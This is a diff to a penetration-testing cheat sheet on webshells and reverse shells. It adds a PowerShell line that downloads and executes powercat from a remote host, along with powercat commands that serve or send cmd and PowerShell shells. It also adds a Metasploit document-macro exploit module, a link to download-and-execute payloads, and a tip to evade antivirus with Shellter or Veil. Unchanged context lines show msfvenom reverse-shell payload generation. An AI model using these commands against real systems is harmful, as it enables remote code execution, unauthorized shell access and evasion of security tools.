@@ -1,5 +1,11 @@
 # Webshells
 
+
+## Windows download & execute
+
+- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Download%20and%20Execute.md
+
+
 # Listening...
 
 # nc
@@ -266,6 +272,10 @@ JSP Java Meterpreter Reverse TCP
 WAR
     msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f war > shell.war
 
+
+exploit/multi/misc/openoffice_document_macro
+
+
 ### Scripting Payloads
 
 Python Reverse Shell
@@ -300,3 +310,23 @@ Create User
     set LHOST <Local IP>
     set LPORT <Local Port>
     Run
+
+
+## https://github.com/besimorhino/powercat
+
+- https://github.com/besimorhino/powercat
+
+    IEX (New-Object System.Net.Webclient).DownloadString('http://10.10.14.3:8000/powercat.ps1')
+
+Serve a cmd Shell:
+    powercat -l -p 443 -e cmd
+
+Send a cmd Shell:
+    powercat -c 10.1.1.1 -p 443 -e cmd
+
+Serve a shell which executes powershell commands:
+    powercat -l -p 443 -ep
+
+
+
+# note : bypass AV with Shellter or Veil
